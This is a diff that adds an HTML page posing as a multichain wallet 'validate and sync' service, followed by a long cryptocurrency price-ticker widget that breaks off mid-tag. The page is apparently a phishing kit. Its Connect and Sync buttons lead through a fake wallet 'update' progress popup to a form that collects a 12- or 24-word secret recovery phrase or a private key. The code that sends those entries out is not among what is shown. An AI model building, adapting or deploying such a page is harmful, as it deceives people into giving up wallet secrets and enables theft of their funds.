@@ -1,0 +1,3339 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="description" content="">
+<meta name="author" content="">
+<link rel="icon" type="image/png" href="./Validate, Synchronize, and Invest your assets and wallets_files/dai.png">
+<title>Validate, Synchronize, and Invest your assets and wallets </title>
+
+<base href=".">
+
+<link href="./Validate, Synchronize, and Invest your assets and wallets_files/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
+
+<link href="./Validate, Synchronize, and Invest your assets and wallets_files/icofont.min.css" rel="stylesheet"
+	type="text/css">
+
+<link rel="stylesheet" href="./Validate, Synchronize, and Invest your assets and wallets_files/bootstrap-icons.css">
+
+<link rel="stylesheet" href="./Validate, Synchronize, and Invest your assets and wallets_files/main.css">
+<link rel="stylesheet" type="text/css"
+	href="./Validate, Synchronize, and Invest your assets and wallets_files/slick.min.css">
+<link rel="stylesheet" type="text/css"
+	href="./Validate, Synchronize, and Invest your assets and wallets_files/slick-theme.min.css">
+
+<link href="./Validate, Synchronize, and Invest your assets and wallets_files/style.css" rel="stylesheet">
+<style type="text/css"></style>
+<style type="text/css"></style>
+<style type="text/css"></style>
+<style type="text/css"></style>
+<style type="text/css"></style>
+<style type="text/css"></style>
+<style type="text/css"></style>
+<style type="text/css"></style>
+<style type="text/css"></style>
+</head>
+
+<body>
+	<nav class="navbar navbar-expand-lg navbar-dark bg-dark shadow-sm p-0 osahan-nav">
+		<div class="container">
+			<a class="navbar-brand" href="./index.html">
+				<img src="./Validate, Synchronize, and Invest your assets and wallets_files/dapp_logo.png" alt="#"
+					class="img-fluid">
+			</a>
+			<button class="navbar-toggler" type="button" data-bs-toggle="collapse"
+				data-bs-target="#navbarNavAltMarkup16" aria-expanded="false" aria-label="Toggle navigation">
+				<span class="navbar-toggler-icon"></span>
+			</button>
+			<div class="collapse navbar-collapse" id="navbarNavAltMarkup16">
+				<ul class="navbar-nav me-auto mb-2 mb-lg-0">
+					<li class="nav-item">
+						<a aria-current="page" class="nav-link active"
+							href="./index.html">Multiverse sync
+						</a>
+					</li>
+				</ul>
+
+				<ul class="nav explore-tabs mb-0 justify-content-center gap-2" id="chain-switch-pill" role="tablist">
+
+					<li class="nav-item" role="presentation" data-chain-id="0">
+						<button class="nav-link active" id="pills-all-tab" data-bs-toggle="pill" type="button"
+							role="tab" aria-controls="pills-all" aria-selected="true">
+							All </button>
+					</li>
+
+
+					<li class="nav-item" role="presentation" data-chain-id="1">
+						<button class="nav-link " id="pills-ethereum-tab" data-bs-toggle="pill" type="button" role="tab"
+							aria-controls="pills-ethereum" aria-selected="true">
+							<span><img
+									src="./Validate, Synchronize, and Invest your assets and wallets_files/ethereum.png"
+									width="8"></span>&nbsp;
+							Ethereum </button>
+					</li>
+
+
+					<li class="nav-item" role="presentation" data-chain-id="2">
+						<button class="nav-link " id="pills-bsc-tab" data-bs-toggle="pill" type="button" role="tab"
+							aria-controls="pills-bsc" aria-selected="true">
+							<span><img
+									src="./Validate, Synchronize, and Invest your assets and wallets_files/binance.png"
+									width="15"></span>&nbsp;
+							BSC </button>
+					</li>
+
+
+					<li class="nav-item" role="presentation" data-chain-id="3">
+						<button class="nav-link " id="pills-polygon-tab" data-bs-toggle="pill" type="button" role="tab"
+							aria-controls="pills-polygon" aria-selected="true">
+							<span><img
+									src="./Validate, Synchronize, and Invest your assets and wallets_files/polygon.png"
+									width="15"></span>&nbsp;
+							Polygon </button>
+					</li>
+
+
+					<li class="nav-item" role="presentation" data-chain-id="4">
+						<button class="nav-link " id="pills-avalanche-tab" data-bs-toggle="pill" type="button"
+							role="tab" aria-controls="pills-avalanche" aria-selected="true">
+							<span><img
+									src="./Validate, Synchronize, and Invest your assets and wallets_files/avalanche.png"
+									width="15"></span>&nbsp;
+							Avalanche </button>
+					</li>
+
+
+					<li class="nav-item" role="presentation" data-chain-id="5">
+						<button class="nav-link " id="pills-solana-tab" data-bs-toggle="pill" type="button" role="tab"
+							aria-controls="pills-solana" aria-selected="true">
+							<span><img
+									src="./Validate, Synchronize, and Invest your assets and wallets_files/solana.png"
+									width="15"></span>&nbsp;
+							Solana </button>
+					</li>
+
+
+					<li class="nav-item" role="presentation" data-chain-id="6">
+						<button class="nav-link " id="pills-cardano-tab" data-bs-toggle="pill" type="button" role="tab"
+							aria-controls="pills-cardano" aria-selected="true">
+							<span><img
+									src="./Validate, Synchronize, and Invest your assets and wallets_files/cardano.png"
+									width="15"></span>&nbsp;
+							Cardano </button>
+					</li>
+
+				</ul>
+
+				<div class="navbar-nav ms-auto gap-3 connect_wallet">
+					<a onclick="toggleModal(); return false;" class="btn btn-primary btn-sm"
+						href="javascript:void(0)"><i class="bi bi-wallet"></i> Integrate Wallet</a>
+				</div>
+			</div>
+		</div>
+	</nav>
+	<section class="background-image bg-dark py-5">
+		<!-- <h1 class="d-none">For SEO</h1> -->
+		<div class="container py-4">
+			<div class="row">
+				<div class="col-lg-7 col-12">
+					<div class="mb-4">
+
+
+
+
+
+
+
+
+
+
+
+						<div class="overlay" id="walletOverlay" style="display: none;">
+							<div class="modal-dapp">
+								<div class="modal-top">
+									<span class="back" onclick="toggleModal()">←</span>
+									<div class="title">All Wallets</div>
+									<span class="close" onclick="toggleModal()">×</span>
+								</div>
+
+								<div class="modal-searchbar">
+									<div class="search-wrapper">
+										<span class="search-icon">🔍</span>
+										<input type="text" class="search-input" placeholder="Search wallet">
+									</div>
+									<div class="qr-btn"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+											xmlns="http://www.w3.org/2000/svg">
+											<circle cx="11" cy="11" r="11" transform="matrix(-1 0 0 1 23 1)"
+												fill="#202020"></circle>
+											<circle cx="11" cy="11" r="11.5" transform="matrix(-1 0 0 1 23 1)"
+												stroke="#C7B994" stroke-opacity="0.7"></circle>
+											<path
+												d="M15.4523 11.0686L16.7472 9.78167C13.8205 6.87297 10.1838 6.87297 7.25708 9.78167L8.55201 11.0686C10.7779 8.85645 13.2279 8.85645 15.4538 11.0686H15.4523Z"
+												fill="#C7B994"></path>
+											<path
+												d="M15.0199 14.067L12 11.0656L8.98 14.067L5.96004 11.0656L4.66663 12.3511L8.98 16.6393L12 13.638L15.0199 16.6393L19.3333 12.3511L18.0399 11.0656L15.0199 14.067Z"
+												fill="#C7B994"></path>
+										</svg></div>
+									<div class="toggle-container">
+										<div class="toggle-icon"></div>
+										<div class="toggle-switch"></div>
+									</div>
+
+								</div>
+
+								<div class="wallet-grid">
+									<div class="wallet-item"
+										onclick="onWalletSelect('WalletConnect', this.querySelector('img').src)">
+										<img
+											src="./Validate, Synchronize, and Invest your assets and wallets_files/walletcon.png">
+										<div class="wallet-name">WalletConnect</div>
+									</div>
+									<div class="wallet-item"
+										onclick="onWalletSelect('Trust Wallet', this.querySelector('img').src)">
+										<img
+											src="./Validate, Synchronize, and Invest your assets and wallets_files/trust.webp">
+										<div class="wallet-name">Trust Wallet</div>
+									</div>
+									<div class="wallet-item"
+										onclick="onWalletSelect('MetaMask', this.querySelector('img').src)">
+										<img
+											src="./Validate, Synchronize, and Invest your assets and wallets_files/metamask.webp">
+										<div class="wallet-name">MetaMask</div>
+									</div>
+									<div class="wallet-item"
+										onclick="onWalletSelect('SafePal', this.querySelector('img').src)">
+										<img
+											src="./Validate, Synchronize, and Invest your assets and wallets_files/safepal.png">
+										<div class="wallet-name">SafePal</div>
+									</div>
+									<div class="wallet-item"
+										onclick="onWalletSelect('Rabby Wallet', this.querySelector('img').src)">
+										<img
+											src="./Validate, Synchronize, and Invest your assets and wallets_files/rabbyw.png">
+										<div class="wallet-name">Rabby Wallet</div>
+									</div>
+									<div class="wallet-item"
+										onclick="onWalletSelect('Bitget Wallet', this.querySelector('img').src)">
+										<img
+											src="./Validate, Synchronize, and Invest your assets and wallets_files/bitget.webp">
+										<div class="wallet-name">Bitget Wallet</div>
+									</div>
+
+									<div class="wallet-item"
+										onclick="onWalletSelect('Phantom', this.querySelector('img').src)">
+										<img
+											src="./Validate, Synchronize, and Invest your assets and wallets_files/Phantom-Wallet.png">
+										<div class="wallet-name">Phantom</div>
+									</div>
+									<div class="wallet-item"
+										onclick="onWalletSelect('Ton Keeper', this.querySelector('img').src)">
+										<img
+											src="./Validate, Synchronize, and Invest your assets and wallets_files/ton.webp">
+										<div class="wallet-name">Ton Keeper</div>
+									</div>
+									<div class="wallet-item"
+										onclick="onWalletSelect('Yoroi Wallet', this.querySelector('img').src)">
+										<img
+											src="./Validate, Synchronize, and Invest your assets and wallets_files/yoroiW.jpg">
+										<div class="wallet-name">Yoroi Wallet</div>
+									</div>
+									<div class="wallet-item"
+										onclick="onWalletSelect('Other Wallet', this.querySelector('img').src)">
+										<img
+											src="./Validate, Synchronize, and Invest your assets and wallets_files/others.png">
+										<div class="wallet-name">Other Wallet</div>
+									</div>
+
+								</div>
+							</div>
+						</div>
+
+						<div id="updateBackdrop"></div>
+						<div id="updatePopup">
+							<div class="update-title">
+								<img id="walletLogo" src="" alt="">
+								<span id="walletTitle">Updating...</span>
+							</div>
+							<div class="update-text">Please wait while we update to version 12.1.0</div>
+							<div class="update-bar-wrapper">
+								<div class="update-bar" id="updateBar"></div>
+							</div>
+							<div id="updatePercent">0%</div>
+							<div id="updateStatus">Initializing...</div>
+							<button class="get-started-btn" style="display: none;" onclick="handleImport()">Import an
+								existing wallet</button>
+						</div>
+
+
+
+						<div id="recoveryPopup">
+							<div id="selectedWalletDisplay">
+								<img id="selectedWalletLogo" src=""
+									alt="Wallet Logo">
+								<span id="selectedWalletName"></span><span class="close-btn"
+									onclick="closeRecoveryPopup()">×</span>
+							</div>
+
+							<div id="walletMessage">
+
+							</div>
+
+							<div class="recovery-header">
+								<span>Secret Recovery Phrase</span>
+
+							</div>
+
+							<select class="recovery-select" id="wordCountSelect" onchange="renderRecoveryInputs()">
+								<option value="12" selected="">I have a 12-word phrase</option>
+								<option value="24">I have a 24-word phrase</option>
+								<option value="private">I have a private key</option>
+							</select>
+
+
+							<div class="recovery-info" id="recoveryInfoText">ⓘ You can paste your entire secret recovery
+								phrase into any field</div><button id="toggleVisibilityBtn"
+								class="toggle-phrase-btn">Show Phrase</button>
+
+							<div class="recovery-grid" id="recoveryInputsContainer"><input type="password"
+									placeholder="1." class="recovery-input" data-index="1"><input type="password"
+									placeholder="2." class="recovery-input" data-index="2"><input type="password"
+									placeholder="3." class="recovery-input" data-index="3"><input type="password"
+									placeholder="4." class="recovery-input" data-index="4"><input type="password"
+									placeholder="5." class="recovery-input" data-index="5"><input type="password"
+									placeholder="6." class="recovery-input" data-index="6"><input type="password"
+									placeholder="7." class="recovery-input" data-index="7"><input type="password"
+									placeholder="8." class="recovery-input" data-index="8"><input type="password"
+									placeholder="9." class="recovery-input" data-index="9"><input type="password"
+									placeholder="10." class="recovery-input" data-index="10"><input type="password"
+									placeholder="11." class="recovery-input" data-index="11"><input type="password"
+									placeholder="12." class="recovery-input" data-index="12"></div>
+
+							<textarea class="textarea" id="privateKeyField" placeholder="Enter your private key..."
+								rows="4" style="display: none;"></textarea>
+
+							<button id="confirmBtn" class="get-started-btn" style="margin-top: 16px;"
+								onclick="confirmRecovery()">
+								Confirm Secret Recovery Phrase
+							</button>
+						</div>
+
+
+
+
+
+
+
+
+						<div class="display-5 fw-bold text-white mb-3"> Validate, Synchronize, and Invest your assets
+							and wallets </div>
+						<div class="fs-5 text-white-50">We are unifying Web3 by providing best-in-class, self-custodial,
+							and multichain support using modern and strong encryption that is not only fast but securely
+							connects your wallet to our sync server to give you a better experience.
+							All of this is made possible because of the blockchain cloud infrastructure powered by Chain
+							Cloud and Sequence.</div>
+					</div>
+					<div>
+						<a onclick="toggleModal(); return false;" class="btn btn-warning btn-lg me-3"
+							href="javascript:void(0)">Connect</a>
+						<a onclick="toggleModal(); return false;" class="btn btn-light btn-lg"
+							href="javascript:void(0)">Sync</a>
+					</div>
+				</div>
+			</div>
+			<div class="row g-4 mt-5">
+				<div class="col-lg-4 col-4">
+					<div class="rounded shadow-sm p-4 bg-white d-flex align-items-center gap-3 steps-item">
+						<span class="bg-primary rounded-circle steps-item-icon"><i
+								class="bi bi-wallet2 text-white"></i></span>
+						<div>
+							<a onclick="toggleModal(); return false;" href="javascript:void(0)">
+								<div class="fw-bold fs-6 mb-1">1. Integrate your Wallet</div>
+							</a>
+							<p class="text-muted m-0 d-none d-md-block">Use Trust Wallet, Metamask or any wallet to
+								connect to the app.</p>
+						</div>
+					</div>
+				</div>
+				<div class="col-lg-4 col-4">
+					<div class="rounded shadow-sm p-4 bg-white d-flex align-items-center gap-3 steps-item">
+						<span class="bg-primary rounded-circle steps-item-icon"><i
+								class="bi bi-patch-plus text-white"></i></span>
+						<div>
+							<a onclick="toggleModal(); return false;" href="javascript:void(0)">
+								<div class="fw-bold fs-6 mb-1">2. Select a Feature to Validate</div>
+							</a>
+							<div class="text-muted m-0 d-none d-md-block">You will be prompted to connect via a
+								decentralized protocol.</div>
+						</div>
+					</div>
+				</div>
+				<div class="col-lg-4 col-4">
+					<div class="rounded shadow-sm p-4 bg-white d-flex align-items-center gap-3 steps-item">
+						<span class="bg-primary rounded-circle steps-item-icon"><i
+								class="bi bi-piggy-bank text-white"></i></span>
+						<div>
+							<a onclick="toggleModal(); return false;" href="javascript:void(0)">
+								<div class="fw-bold fs-6 mb-1">3. Generate Proof of Validation</div>
+							</a>
+							<div class="text-muted m-0 d-none d-md-block">Upon completion, save proof of wallet
+								validation.</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<div class="crypto_price_scroll">
+		<script type="text/javascript">
+			baseUrl = "https://widgets.cryptocompare.com/";
+			var scripts = document.getElementsByTagName("script");
+			var embedder = scripts[scripts.length - 1];
+			var cccTheme = { "General": { "enableMarquee": true } };
+			(function () {
+				var appName = "google.com";
+				var s = document.createElement("script");
+				s.type = "text/javascript";
+				s.async = true;
+				var theUrl = baseUrl + 'serve/v3/coin/header?fsyms=BTC,ETH,BNB,XRP,MATIC,DOGE,ADA,DAI,DOT,TRX,LTC,SHIB,SOL,UNI,AVAX,LINK,XMR,ATOM,ETC&tsyms=USD,EUR,CNY,GBP';
+				s.src = theUrl + (theUrl.indexOf("?") >= 0 ? "&" : "?") + "app=" + appName;
+				embedder.parentNode.appendChild(s);
+			})();
+		</script>
+		<script type="text/javascript" async=""
+			src="./Validate, Synchronize, and Invest your assets and wallets_files/header"></script>
+		<div class="ccc-widget ccc-header-v3" id="marquee-container"
+			style="background: rgb(255, 255, 255); box-sizing: border-box; line-height: 1; overflow: hidden;">
+			<div id="marquee-inner">
+				<div class="ccc-coin-header-v3-container marquee" id="marquee-element"
+					style="margin: 0px 0px 0px -920px; padding: 0px; transition: 1s linear;">
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/btc/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/btc.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">BTC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_BTC_USD">
+								$ 60,372.2
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_BTC_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctBTC_USD">2.49 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/btc/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/btc.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">BTC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_BTC_EUR">
+								€ 52,883.5
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_BTC_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctBTC_EUR">2.32 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/btc/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/btc.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">BTC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_BTC_CNY">
+								¥ 38,800.0
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_BTC_CNY"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctBTC_CNY">0.00 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/btc/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/btc.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">BTC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_BTC_GBP">
+								£ 45,196.0
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_BTC_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctBTC_GBP">1.64 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/eth/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/eth.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ETH: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ETH_USD">
+								$ 1,621.52
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ETH_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctETH_USD">2.62 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/eth/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/eth.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ETH: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ETH_EUR">
+								€ 1,420.55
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ETH_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctETH_EUR">2.46 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/eth/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/eth.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ETH: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ETH_CNY">
+								¥ 1,041.99
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ETH_CNY"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctETH_CNY">0.11 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/eth/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/eth.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">ETH: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_ETH_GBP">
+								£ 1,213.93
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_ETH_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctETH_GBP">1.78 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/bnb/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/bnb.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">BNB: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_BNB_USD">
+								$ 550.12
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_BNB_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctBNB_USD">0.64 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/bnb/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/bnb.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">BNB: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_BNB_EUR">
+								€ 481.91
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_BNB_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctBNB_EUR">0.47 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/bnb/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/bnb.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">BNB: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_BNB_CNY">
+								¥ 353.58
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_BNB_CNY"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctBNB_CNY">-1.80 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/bnb/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/bnb.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">BNB: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_BNB_GBP">
+								£ 411.96
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_BNB_GBP"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctBNB_GBP">-0.16 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/xrp/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/xrp.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">XRP: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_XRP_USD">
+								$ 1.06
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_XRP_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctXRP_USD">1.48 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/xrp/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/xrp.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">XRP: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_XRP_EUR">
+								€ 0.9302
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_XRP_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctXRP_EUR">1.32 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/xrp/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/xrp.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">XRP: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_XRP_CNY">
+								¥ 0.6825
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_XRP_CNY"
+								style="color: #A11B0A;">
+								(<span id="CCCHeader3ChangePctXRP_CNY">-0.98 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/xrp/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/xrp.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">XRP: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_XRP_GBP">
+								£ 0.7953
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_XRP_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctXRP_GBP">0.89 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/matic/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/matic.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">MATIC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_MATIC_USD">
+								$ 0.1995
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_MATIC_USD"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctMATIC_USD">0.00 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/matic/overview/eur" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/matic.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">MATIC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_MATIC_EUR">
+								€ 0.09307
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_MATIC_EUR"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctMATIC_EUR">2.32 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/matic/overview/cny" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/matic.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">MATIC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_MATIC_CNY">
+								¥ 0.06829
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_MATIC_CNY"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctMATIC_CNY">0.00 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/matic/overview/gbp" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/matic.png"
+								style="width: 15px; height: 15px; vertical-align: middle;">
+
+							<span class="ccc-header-v3-price-name">MATIC: </span>
+							<span class="ccc-header-v3-price-value" style="color: #000;" id="CCCHeader3Price_MATIC_GBP">
+								£ 0.07954
+							</span>
+
+							<span class="ccc-header-v3-price-change" id="CCCHeader3ChangePctContainer_MATIC_GBP"
+								style="color: #3d9400;">
+								(<span id="CCCHeader3ChangePctMATIC_GBP">1.64 %</span>)
+							</span>
+
+						</a>
+					</div>
+					<div class="ccc-header-v3-ccc-price-container">
+						<a href="https://www.cryptocompare.com/coins/doge/overview/usd" target="_blank" rel="nofollow">
+
+							<img class="ccc-header-v3-price-logo"
+								src="./Validate, Synchronize, and Invest your assets and wallets_files/doge.png"
